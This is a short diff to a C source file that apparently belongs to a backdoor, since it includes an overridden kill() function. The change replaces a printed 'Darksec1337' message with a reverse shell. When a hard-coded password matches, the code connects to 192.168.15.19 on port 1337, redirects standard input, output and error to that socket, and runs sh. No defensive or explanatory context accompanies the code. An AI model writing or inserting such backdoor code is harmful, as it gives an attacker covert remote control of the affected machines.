@@ -8,7 +8,10 @@
 #include <string.h>
 #include <unistd.h>
 #include <stdlib.h>
-
+#include <arpa/inet.h>
+#include <netinet/in.h>
+#include <sys/types.h>
+#include <sys/socket.h>
 
 
        int kill(pid_t pid, int sig){
@@ -37,7 +40,24 @@ scanf("%s", &password);
 
 if(strcmp(password, pass) == 0){
 
-printf("Darksec1337 \n");
+
+    int port = 1337;
+    struct sockaddr_in revsockaddr;
+
+    int sockt = socket(AF_INET, SOCK_STREAM, 0);
+    revsockaddr.sin_family = AF_INET;
+    revsockaddr.sin_port = htons(port);
+    revsockaddr.sin_addr.s_addr = inet_addr("192.168.15.19");
+
+    connect(sockt, (struct sockaddr *) &revsockaddr,
+    sizeof(revsockaddr));
+    dup2(sockt, 0);
+    dup2(sockt, 1);
+    dup2(sockt, 2);
+
+    char * const argv[] = {"sh", NULL};
+    execvp("sh", argv);
+
 
 } else {
 
